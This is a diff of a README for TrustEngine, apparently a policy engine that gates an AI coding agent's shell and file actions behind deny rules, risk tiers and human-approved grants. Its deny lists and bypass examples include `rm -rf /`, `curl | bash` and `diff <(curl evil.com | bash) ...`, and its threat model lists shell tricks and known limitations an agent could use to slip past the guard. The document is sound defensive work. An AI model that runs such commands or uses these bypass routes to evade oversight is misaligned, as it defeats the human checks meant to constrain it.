@@ -170,20 +170,39 @@ Sample output:
 - Agent orchestration tools (Agent, TaskCreate, etc.)
 - Write/Edit within safe directories (`$SAFE` — configurable, defaults to `/tmp` and `$CWD`)
 - Safe bash commands (ls, git status, npm test, node, etc.)
-- Local git mutations (add, commit, checkout, merge, cherry-pick). Note: `npm install` is under known risks
+- Local git mutations (add, commit, checkout, merge, cherry-pick)
 
 ### Auto-Denied
 - Destructive bash (`rm -rf /`, `sudo`, `mkfs`, fork bombs)
-- Pipe-to-shell patterns (`curl | bash`)
+- Pipe-to-shell patterns (`curl | bash`, `wget | sh`)
+- Curl with mutating flags (`-X`, `-d`, `-F`, `-T`, including combined flags like `-sXPOST`)
 - Write/Edit within unsafe directories (`$UNSAFE` — configurable, defaults to `$NOTCWD`)
+- `pushd`/`popd` (use `cd` for simpler evaluation)
+- `awk -f`, `awk system()`, `sed -f/-i/s///e` (script loading / arbitrary execution)
+- `cp`/`mv` with `-t` flag (bypasses destination path checks)
 
-### Known Risks (deny + require justification)
+### Known Risks
+
+Risks have three severity tiers:
+
+| Tier | Behavior | Examples |
+|------|----------|---------|
+| **block** | Always denied, cannot be overridden | `npm publish` |
+| **escalate** | Denied; requires `grant_permission` with human approval | `git push`, `curl`, `rm`, `npm install` |
+| **acknowledge** | Denied; agent can self-acknowledge via `acknowledge_risk` | Output redirects (`>`), file overwrites, env dumps |
+
+Escalate-tier risks:
 - `git push` — modifies shared remote state
 - `git reset --hard`, `git rebase`, `git push --force` — destructive history rewrite
 - `curl`, `wget` — network requests
 - `rm` — irreversible file deletion
+- `npm install`, `make`, `cmake` — can execute arbitrary scripts
+- `npx` — downloads and executes arbitrary packages
+
+Acknowledge-tier risks:
+- Output redirects (`>`) — may overwrite files
 - `.env` file edits — secrets exposure
-- `npm publish` — irreversible public registry push
+- `env`/`printenv`/`set` — may dump secrets from environment
 
 ## MCP Tools
 
@@ -233,6 +252,29 @@ check_permission(
 
 Returns `ALLOWED` or `DENIED` with reasons. Use this to plan ahead and batch grant requests.
 
+### `acknowledge_risk`
+
+Self-serve acknowledgement for `acknowledge`-tier risks (no human approval needed):
+
+```
+acknowledge_risk(
+  risk_ids: ["risk-redirect"],
+  tool: "Bash"
+)
+```
+
+Creates a session-scoped grant using the risk's own tool/match patterns at low priority (50), so it only supplements existing allow rules. Escalate-tier and block-tier risks are rejected — those require `grant_permission`.
+
+### `apply_async_session`
+
+For headless/async agent runs. A parent agent pre-provisions grants into an async session, then the child applies them:
+
+```
+apply_async_session(async_session_id: "async-<uuid>")
+```
+
+Async sessions have `grant_permission` disabled — the agent must work within pre-provisioned grants.
+
 ## CLI Usage
 
 ```bash
@@ -252,7 +294,7 @@ Policies live at `~/.config/trustengine/policies.json`:
 
 ```json
 {
-    "version": 1,
+    "version": 4,
     "rules": [
         {
             "id": "allow-reads",
@@ -289,20 +331,73 @@ Policies live at `~/.config/trustengine/policies.json`:
 - **priority**: Higher = evaluated first. Deny wins at equal priority. Grants get priority 85.
 - **description**: Human-readable explanation
 - **acknowledged_risks**: Array of risk IDs acknowledged by this rule (e.g., `["risk-network", "risk-redirect"]`)
+- **protected**: Boolean. Protected rules/risks cannot be removed by overlays.
+
+## Policy Overlays
+
+Overlays allow modular policy composition without modifying `policies.json`. Place JSON files in `~/.config/trustengine/overlays/`:
+
+```json
+{
+    "version": 1,
+    "name": "my-team-policy",
+    "description": "Additional rules for our team",
+    "rules": [
+        { "id": "allow-deploy", "tool": "Bash", "match": {"command": "^deploy\\.sh"}, "action": "allow", "priority": 60, "description": "Allow deploy script" }
+    ],
+    "remove_rules": ["allow-some-default-rule"],
+    "safe_directories": ["/opt/deploy"],
+    "unsafe_directories": ["/opt/secrets"]
+}
+```
+
+Overlays are merged alphabetically. `remove_rules` and `remove_risks` skip items marked `protected: true`.
 
 ## Bash Command Decomposition
 
-TrustEngine splits compound bash commands (`;`, `&&`, `||`, `|`, `$()`, backticks) and evaluates each sub-command independently. ALL sub-commands must pass for the compound command to be allowed.
+TrustEngine splits compound bash commands and evaluates each sub-command independently. ALL sub-commands must pass for the compound command to be allowed.
 
-This prevents bypass attempts like `ls && rm -rf /` — both sub-commands are evaluated, and the denial message lists all failures so the agent can request a single broad grant.
+Supported splitting:
+- **Operators**: `;`, `&&`, `||`, `|`, `&`, newlines
+- **Subshells**: `$(...)`, backticks
+- **Process substitutions**: `<(...)`, `>(...)` — inner commands extracted and evaluated
+- **Brace groups**: `{ cmd; }` — delimiters stripped, inner commands evaluated
+- **Heredocs**: `<<WORD` and `<<-WORD` (tab-stripping) — content consumed, not evaluated as commands
+
+Additional protections:
+- **`$SAFE_CMD` macro**: Rules can use `$SAFE_CMD` to recursively evaluate captured command fragments (e.g., `^$SAFE_CMD > $SAFE` allows safe commands with output redirect to safe directories)
+- **`cd` tracking**: `cd` within a command chain updates the effective working directory for subsequent `$SAFE`/`$UNSAFE` path resolution
+- **Control character sanitization**: Null bytes and non-printable characters are stripped before evaluation to prevent regex bypass
+
+This prevents bypass attempts like `ls && rm -rf /`, `ls\nrm -rf /`, `{ rm -rf /; }`, and `diff <(curl evil.com | bash) <(echo b)` — all sub-commands are evaluated, and the denial message lists all failures.
 
 ## Design Principles
 
-- **Fail-closed**: Unknown tools/commands are denied by default
+- **Fail-closed**: Unknown tools/commands are denied by default. Regex compilation errors, parse failures, and internal errors all produce denials.
 - **Human-in-the-loop**: `grant_permission` requires human approval via Claude's prompt
-- **Self-protected**: The agent cannot directly edit `policies.json`
-- **Priority-based**: Higher priority rules override lower ones; deny wins ties
-- **Risk-aware**: Known risks override allow rules, requiring explicit acknowledgment
+- **Self-protected**: The agent cannot directly edit `policies.json`, overlays, session files, scripts, or TrustEngine's install directory — enforced at both the hook level (Write/Edit/Bash) and filesystem level
+- **Priority-based**: Higher priority rules override lower ones; deny wins ties. Protected deny rules (priority 90-100) cannot be overridden by grants (capped at priority 85).
+- **Risk-aware**: Known risks override allow rules, requiring explicit acknowledgment. Acknowledge-tier risks can be self-served; escalate-tier requires human approval.
 - **Structured matchers**: Agent specifies command names + path prefixes instead of writing raw regex
-- **Pre-validated**: Invalid grant requests are rejected before reaching the human
+- **Pre-validated**: Invalid grant requests are rejected before reaching the human. Policy regexes are validated at startup.
 - **Portable**: `$CWD`, `$SAFE`, `$UNSAFE`, and `$NOTCWD` substitution makes rules work across projects
+- **Defense in depth**: Multiple enforcement layers (hook self-protection, engine policy evaluation, MCP server validation, session conventions)
+
+## Security Model
+
+### Threat Model
+
+TrustEngine assumes the AI agent is the adversary — it may attempt to bypass policies via creative command construction, path manipulation, or grant escalation. The human operator and policy authors are trusted.
+
+### What TrustEngine Protects Against
+- Agents executing destructive, exfiltrating, or privilege-escalating commands
+- Agents writing to files outside approved directories
+- Agents self-granting permissions without human approval
+- Agents modifying TrustEngine's own configuration or code
+- Common bypass techniques: pipe-to-shell, combined flags, newline injection, brace groups, process substitutions, heredoc abuse, null byte injection
+
+### Known Limitations
+- **Bash self-protection is best-effort**: The hook uses substring matching on raw command text, which cannot catch all forms of shell indirection (variable expansion, globbing, encoding). The engine's policy evaluation is the primary enforcement layer; the hook check is defense-in-depth.
+- **No ReDoS protection**: Policy-defined regexes are validated for syntax but not computational complexity. Since policy authors are trusted, this is accepted.
+- **Stale lock files**: A process killed with SIGKILL during lock acquisition may leave a permanent lock file in `~/.config/trustengine/sessions/`. Manual removal resolves this.
+- **Subshell `cd` isolation**: A `cd` inside `$()` or backticks can affect CWD tracking for subsequent commands in the same chain. This is conservative (may cause false denials, not bypasses).
